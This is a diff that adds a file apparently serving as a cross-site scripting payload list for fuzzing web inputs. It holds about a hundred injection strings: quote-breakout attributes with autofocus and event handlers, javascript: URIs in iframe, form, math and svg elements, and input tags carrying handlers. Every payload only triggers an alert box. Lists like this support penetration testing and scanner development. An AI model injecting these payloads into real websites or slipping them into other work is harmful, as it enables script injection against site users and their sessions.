@@ -1,0 +1,106 @@
+" autofocus onfocus="alert('XSS')"
+" autofocus onblur="alert('XSS')"
+" autofocus oninput="alert('XSS')"
+" autofocus onchange="alert('XSS')"
+" autofocus onmouseover="alert('XSS')"
+" autofocus onmouseout="alert('XSS')"
+" autofocus onkeydown="alert('XSS')"
+" autofocus onkeyup="alert('XSS')"
+" autofocus onkeypress="alert('XSS')"
+" autofocus onclick="alert('XSS')"
+" autofocus ondblclick="alert('XSS')"
+" autofocus onmousedown="alert('XSS')"
+" autofocus onmouseup="alert('XSS')"
+" autofocus onmousemove="alert('XSS')"
+" autofocus onmouseenter="alert('XSS')"
+" autofocus onmouseleave="alert('XSS')"
+" autofocus onwheel="alert('XSS')"
+" autofocus oncopy="alert('XSS')"
+" autofocus oncut="alert('XSS')"
+" autofocus onpaste="alert('XSS')"
+" autofocus oncontextmenu="alert('XSS')"
+" autofocus onsubmit="alert('XSS')"
+" autofocus onreset="alert('XSS')"
+" autofocus onfocusin="alert('XSS')"
+" autofocus onfocusout="alert('XSS')"
+" autofocus onselect="alert('XSS')"
+" autofocus ondrag="alert('XSS')"
+" autofocus ondragstart="alert('XSS')"
+" autofocus ondragend="alert('XSS')"
+" autofocus ondragover="alert('XSS')"
+" autofocus ondragenter="alert('XSS')"
+" autofocus ondragleave="alert('XSS')"
+" autofocus ondrop="alert('XSS')"
+" autofocus onresize="alert('XSS')"
+" autofocus onscroll="alert('XSS')"
+" autofocus oncopy="alert('XSS')"
+" autofocus oncut="alert('XSS')"
+" autofocus onpaste="alert('XSS')"
+" autofocus onabort="alert('XSS')"
+" autofocus oncanplay="alert('XSS')"
+" autofocus oncanplaythrough="alert('XSS')"
+" autofocus oncuechange="alert('XSS')"
+" autofocus ondurationchange="alert('XSS')"
+" autofocus onemptied="alert('XSS')"
+" autofocus onended="alert('XSS')"
+" autofocus onerror="alert('XSS')"
+" autofocus onloadeddata="alert('XSS')"
+" autofocus onloadedmetadata="alert('XSS')"
+" autofocus onloadstart="alert('XSS')"
+" autofocus onpause="alert('XSS')"
+" autofocus onplay="alert('XSS')"
+" autofocus onplaying="alert('XSS')"
+" autofocus onprogress="alert('XSS')"
+" autofocus onratechange="alert('XSS')"
+" autofocus onseeked="alert('XSS')"
+" autofocus onseeking="alert('XSS')"
+<iframe src="javascript:alert('XSS')"></iframe>
+<math href="javascript:alert('XSS')">
+<isindex action="javascript:alert('XSS')">
+<form action="javascript:alert('XSS')"><input type="submit"></form>
+<math>
+    <a xlink:href="javascript:alert('XSS')">X</a>
+</math>
+<body onload=alert('XSS')>
+<svg>
+    <a xlink:href="javascript:alert('XSS')">X</a>
+</svg>
+<svg onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<input value="" type="number" onfocus="alert(1)">
+<input value="" type="number" onblur="alert(1)">
+<input value="" type="number" onchange="alert(1)">
+<input value="" type="number" oninput="alert(1)">
+<input value="" type="number" onclick="alert(1)">
+<input value="" type="number" ondblclick="alert(1)">
+<input value="" type="number" onmousedown="alert(1)">
+<input value="" type="number" onmouseup="alert(1)">
+<input value="" type="number" onmouseover="alert(1)">
+<input value="" type="number" onmousemove="alert(1)">
+<input value="" type="number" onmouseout="alert(1)">
+<input value="" type="number" onmouseenter="alert(1)">
+<input value="" type="number" onmouseleave="alert(1)">
+<input value="" type="number" onkeypress="alert(1)">
+<input value="" type="number" onkeydown="alert(1)">
+<input value="" type="number" onkeyup="alert(1)">
+<input value="" type="number" onresize="alert(1)">
+<input value="" type="number" onscroll="alert(1)">
+<input value="" type="number" onwheel="alert(1)">
+<input value="" type="number" ondrag="alert(1)">
+<input value="" type="number" ondragstart="alert(1)">
+<input value="" type="number" ondragend="alert(1)">
+<input value="" type="number" ondragenter="alert(1)">
+<input value="" type="number" ondragover="alert(1)">
+<input value="" type="number" ondragleave="alert(1)">
+<input value="" type="number" ondrop="alert(1)">
+<input value="" type="number" oncontextmenu="alert(1)">
+<input value="" type="number" onforminput="alert(1)">
+<input value="" type="number" onformchange="alert(1)">
+<input value="" type="number" onfocusin="alert(1)">
+<input value="" type="number" onfocusout="alert(1)">
+<input value="" type="number" onselect="alert(1)">
+<input value="" type="number" onshow="alert(1)">
+<input value="" type="number" ontoggle="alert(1)">
+<input value="" type="number" onsubmit="alert(1)">
+<input value="" type="number" oninvalid="alert(1)">
+<input value="" type="number" onreset="alert(1)">
